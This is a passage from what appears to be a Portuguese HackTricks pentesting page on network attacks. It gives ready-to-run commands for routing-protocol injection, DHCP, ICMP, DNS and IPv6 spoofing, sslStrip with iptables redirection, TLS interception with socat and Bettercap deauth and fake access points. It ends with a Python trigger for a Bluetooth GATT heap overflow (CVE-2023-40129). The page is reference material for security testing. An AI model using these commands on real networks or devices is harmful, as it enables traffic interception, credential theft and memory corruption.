Note que o RIPv2 suporta autenticação MD5 enquanto o RIPng não inclui autenticação nativa, dependendo de cabeçalhos IPsec AH e ESP no IPv6.

### EIGRP Attacks

**EIGRP (Enhanced Interior Gateway Routing Protocol)** é um protocolo de roteamento dinâmico. **É um protocolo distance-vector.** Se não houver **autenticação** e configuração de interfaces passive, um **invasor** pode interferir no roteamento EIGRP e causar **envenenamento de tabelas de roteamento**. Além disso, a rede EIGRP (ou seja, sistema autônomo) **é plana e não possui segmentação em zonas**. Se um **atacante injetar uma rota**, é provável que essa rota **se espalhe** por todo o sistema EIGRP autônomo.

Atacar um sistema EIGRP requer **estabelecer uma adjacência com um roteador EIGRP legítimo**, o que abre muitas possibilidades, desde reconhecimento básico até várias injeções.

[**FRRouting**](https://frrouting.org/) permite implementar **um roteador virtual que suporta BGP, OSPF, EIGRP, RIP e outros protocolos.** Basta implantá-lo no sistema do atacante e você pode realmente se passar por um roteador legítimo no domínio de roteamento.


{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/) possui capacidades para interceptar transmissões EIGRP. Também permite injetar pacotes para alterar configurações de roteamento.

### OSPF

No protocolo Open Shortest Path First (OSPF) **autenticação MD5 é comumente empregada para garantir comunicação segura entre roteadores**. No entanto, essa medida de segurança pode ser comprometida usando ferramentas como Loki e John the Ripper. Essas ferramentas são capazes de capturar e quebrar hashes MD5, expondo a chave de autenticação. Uma vez obtida a chave, ela pode ser usada para introduzir novas informações de roteamento. Para configurar os parâmetros de rota e estabelecer a chave comprometida, utilizam-se as abas _Injection_ e _Connection_, respectivamente.

- **Captura e quebra de hashes MD5:** Ferramentas como Loki e John the Ripper são usadas para isso.
- **Configuração de parâmetros de rota:** Feita através da aba _Injection_.
- **Configuração da chave comprometida:** A chave é configurada na aba _Connection_.

### Other Generic Tools & Sources

- [**Above**](https://github.com/c4s73r/Above): Ferramenta para escanear tráfego de rede e encontrar vulnerabilidades
- Você pode encontrar mais informações sobre **ataques de rede** [**here**](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Spoofing**

O atacante configura todos os parâmetros de rede (GW, IP, DNS) do novo membro da rede enviando respostas DHCP falsas.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Check the [previous section](#arp-spoofing).

### ICMPRedirect

ICMP Redirect consiste em enviar um ICMP packet type 1 code 5 que indica que o attacker é o melhor caminho para alcançar um IP. Então, quando a victim quiser entrar em contato com o IP, enviará o packet através do attacker.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

O attacker irá resolver alguns (ou todos) os domínios que o victim solicitar.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Configurar o próprio DNS com dnsmasq**
```bash
apt-get install dnsmasq
echo "addn-hosts=dnsmasq.hosts" > dnsmasq.conf
echo "127.0.0.1   domain.example.com" > dnsmasq.hosts
sudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Gateways Locais

Frequentemente existem múltiplas rotas para sistemas e redes. Depois de construir uma lista de endereços MAC na rede local, use _gateway-finder.py_ para identificar hosts que suportam encaminhamento IPv4.

<details>
<summary>exemplo de uso do gateway-finder</summary>
```bash
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
</details>


### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Para resolução de nomes local quando as consultas DNS falham, sistemas Microsoft dependem de **Link-Local Multicast Name Resolution (LLMNR)** e do **NetBIOS Name Service (NBT-NS)**. Da mesma forma, implementações **Apple Bonjour** e **Linux zero-configuration** utilizam **Multicast DNS (mDNS)** para descobrir sistemas dentro de uma rede. Devido à natureza não autenticada desses protocolos e ao fato de operarem sobre UDP, enviando mensagens broadcast, eles podem ser explorados por atacantes que buscam redirecionar usuários para serviços maliciosos.

Você pode personificar serviços que são procurados pelos hosts usando o Responder para enviar respostas falsas.\  
Read here more information about [how to Impersonate services with Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Navegadores comumente empregam o **Web Proxy Auto-Discovery (WPAD)** para adquirir automaticamente as configurações de proxy. Isso envolve buscar detalhes de configuração de um servidor, especificamente através de uma URL como "http://wpad.example.org/wpad.dat". A descoberta desse servidor pelos clientes pode ocorrer por vários mecanismos:

- Através de **DHCP**, onde a descoberta é facilitada pela utilização de uma entrada com código especial 252.
- Por **DNS**, que envolve procurar por um nome de host rotulado _wpad_ dentro do domínio local.
- Via **Microsoft LLMNR e NBT-NS**, que são mecanismos de fallback usados quando as consultas DNS não obtêm sucesso.

A ferramenta Responder se aproveita desse protocolo atuando como um **servidor WPAD malicioso**. Ela usa DHCP, DNS, LLMNR e NBT-NS para enganar clientes a se conectarem a ela. Para aprofundar em como serviços podem ser personificados usando o Responder [check this](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

Você pode oferecer diferentes serviços na rede para tentar **enganar um usuário** a inserir algumas **plain-text credentials**. **More information about this attack in** [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)**.**

### IPv6 Neighbor Spoofing

Este ataque é muito semelhante ao ARP Spoofing, mas no mundo IPv6. Você pode fazer a vítima acreditar que o IPv6 do GW possui o MAC do atacante.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

Alguns sistemas operacionais configuram por padrão o gateway a partir dos pacotes RA enviados na rede. Para declarar o atacante como IPv6 router você pode usar:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

Por padrão, alguns OS tentam configurar o DNS lendo um pacote DHCPv6 na rede. Então, um atacante poderia enviar um pacote DHCPv6 para se configurar como servidor DNS. O DHCP também fornece um IPv6 para a vítima.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (página falsa e injeção de código JS)

## Ataques na Internet

### sslStrip

Basicamente o que esse ataque faz é, caso o **user** tente **access** uma página **HTTP** que esteja **redirecting** para a versão **HTTPS**. **sslStrip** irá **maintain** uma **HTTP connection with** o **client** e uma **HTTPS connection with** o **server**, então ele será capaz de **sniff** a conexão em **plain text**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
Mais informações [aqui](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ and dns2proxy para contornar HSTS

A **diferença** entre **sslStrip+ e dns2proxy** em relação ao **sslStrip** é que eles irão **redirigir**, por exemplo, _**www.facebook.com**_ **para** _**wwww.facebook.com**_ (observe o **extra** "**w**") e irão definir o **endereço desse domínio como o IP do atacante**. Desta forma, o **cliente** irá **conectar-se** a _**wwww.facebook.com**_ **(o atacante)**, mas nos bastidores **sslstrip+** irá **manter** a **conexão real** via https com **www.facebook.com**.

O **objetivo** desta técnica é **evitar HSTS** porque _**wwww**.facebook.com_ **não será** salvo no **cache** do navegador, então o navegador será enganado para realizar a **autenticação do facebook via HTTP**.\
Note que, para executar este ataque, a vítima tem que tentar acessar inicialmente [http://www.faceook.com](http://www.faceook.com) e não https. Isso pode ser feito modificando os links dentro de uma página http.

Mais informações [aqui](https://www.bettercap.org/legacy/#hsts-bypass), [aqui](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) e [aqui](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip or sslStrip+ doesn't work anymore. This is because there are HSTS rules presaved in the browsers, so even if it's the first time that a user access an "important" domain he will access it via HTTPS. Also, notice that the presaved rules and other generated rules can use the flag** [**`includeSubdomains`**](https://hstspreload.appspot.com) **so the** _**wwww.facebook.com**_ **example from before won't work anymore as** _**facebook.com**_ **uses HSTS with `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP listen na porta
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL: escutar em porta

#### Gerar chaves e certificado autoassinado
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Escutar usando certificado
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Escutar usando certificado e redirecionar para os hosts
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Às vezes, se o client verificar que a CA é válida, você poderia **servir um certificate de outro hostname assinado por uma CA**.\
Outro teste interessante é servir um c**ertificate do hostname solicitado mas self-signed**.

Outras coisas a testar são tentar assinar o certificate com um certificate válido que não seja uma CA válida. Ou usar uma public key válida, forçar o uso de um algoritmo como diffie hellman (um que não precise descriptografar nada com a real private key) e, quando o client solicitar uma probe da real private key (como um hash), enviar uma probe falsa e esperar que o client não verifique isso.

## Bettercap

<details>
<summary>Comandos comuns do Bettercap</summary>
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
</details>


### Notas de Descoberta Ativa

Tenha em conta que, quando um pacote UDP é enviado para um dispositivo que não possui a porta solicitada, um ICMP (Port Unreachable) é enviado.

### **ARP discover**

Pacotes ARP são usados para descobrir quais IPs estão a ser usados dentro da rede. O PC tem de enviar uma requisição para cada endereço IP possível e apenas os que estiverem a ser usados irão responder.

### **mDNS (multicast DNS)**

Bettercap envia um pedido MDNS (a cada X ms) pedindo por **\_services\_.dns-sd.\_udp.local** — a máquina que vê este pacote normalmente responde a este pedido. Depois, ele procura apenas por máquinas que respondem a "services".

**Ferramentas**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS (NetBios Name Server)**

Bettercap envia pacotes em broadcast para a porta 137/UDP pedindo pelo nome "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap envia pacotes SSDP em broadcast procurando por todo tipo de serviços (UDP Port 1900).

### **WSD (Web Service Discovery)**

Bettercap envia pacotes WSD em broadcast procurando por serviços (UDP Port 3702).


## Bluetooth (L2CAP/ATT/GATT) Ataques

- Android Fluoride exposes services over L2CAP PSMs (e.g., SDP 0x0001, RFCOMM 0x0003, BNEP 0x000F, AVCTP 0x0017/0x001B, AVDTP 0x0019, ATT/GATT 0x001F). Services register via:
```c
uint16_t L2CA_Register2(uint16_t psm, const tL2CAP_APPL_INFO& p_cb_info,
bool enable_snoop, tL2CAP_ERTM_INFO* p_ertm_info,
uint16_t my_mtu, uint16_t required_remote_mtu,
uint16_t sec_level);
```
- BlueBlue framework permite Scapy-based L2CAP/ATT crafting (construído sobre BlueBorne l2cap_infra). Exemplo:
```python
acl  = ACLConnection(src_bdaddr, dst_bdaddr, auth_mode='justworks')
gatt = acl.l2cap_connect(psm=PSM_ATT, mtu=672)
gatt.send_frag(p8(GATT_READ)+p16(1234))
print(gatt.recv())
```
- CVE-2023-40129 (Fluoride GATT): integer underflow em Read Multiple Variable response builder pode causar ~64KB heap overflow quando MTU trunca um elemento de comprimento variável, mas o campo de comprimento +2 não é contabilizado.

<details>
<summary>Causa raiz (GATT Read Multiple Variable)</summary>
```c
static void build_read_multi_rsp(tGATT_SR_CMD* p_cmd, uint16_t mtu) {
uint16_t ii, total_len, len; uint8_t* p; bool is_overflow=false;
len = sizeof(BT_HDR) + L2CAP_MIN_OFFSET + mtu;
BT_HDR* p_buf = (BT_HDR*)osi_calloc(len); p_buf->offset=L2CAP_MIN_OFFSET;
p = (uint8_t*)(p_buf + 1) + p_buf->offset; *p++ = GATT_RSP_READ_MULTI_VAR;
p_buf->len=1;
for (ii=0; ii<p_cmd->multi_req.num_handles; ii++) {
tGATTS_RSP* p_rsp = ...; // dequeued
if (p_rsp) {
total_len = (p_buf->len + p_rsp->attr_value.len);
if (p_cmd->multi_req.variable_len) total_len += 2;
if (total_len > mtu) {
len = p_rsp->attr_value.len - (total_len - mtu); // BUG: ignores +2
is_overflow = true;
} else { len = p_rsp->attr_value.len; }
if (p_cmd->multi_req.variable_len) { UINT16_TO_STREAM(p, len); p_buf->len += 2; }
memcpy(p, p_rsp->attr_value.value, len); // heap overflow
if (!is_overflow) p += len; p_buf->len += len; if (is_overflow) break;
}
}
}
```
- Em entradas de tamanho variável, o caminho de overflow subtrai apenas (total_len - mtu), ignorando o campo de comprimento +2, então len underflows (por exemplo, 0xFFFE) e memcpy escreve ~64KB além do final do buffer.
</details>

- Gatilho mínimo não autenticado (MTU pequena força underflow no 4º atributo):
```python
# GATT_REQ_READ_MULTI_VAR (0x20), MTU=55
acl  = ACLConnection(interface, bdaddr)
gatt = acl.l2cap_connect(psm=PSM_ATT, mtu=55)
pkt  = b'\x20'  # opcode
pkt += p16(9); pkt += p16(9); pkt += p16(9); pkt += p16(9)
gatt.send(pkt)
# On 4th insert: p_buf->len=55 (1 + 3*(16+2)), total_len=73 -> len=16-(73-55)=-2 -> ~64KB overwrite
```
### Exploração Telecom / Mobile-Core (GTP)


{{#ref}}
telecom-network-exploitation.md
{{#endref}}

## Referências

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **Avaliação de Segurança de Rede: Conheça Sua Rede (3ª edição)**
- **Practical IoT Hacking: O Guia Definitivo para Atacar a Internet das Coisas. Por Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- [Paint it blue: Attacking the bluetooth stack (Synacktiv)](https://www.synacktiv.com/en/publications/paint-it-blue-attacking-the-bluetooth-stack)
- [BlueBorne L2CAP testing infra (l2cap_infra)](https://github.com/ArmisSecurity/blueborne/tree/master/l2cap_infra)



{{#include ../../banners/hacktricks-training.md}}
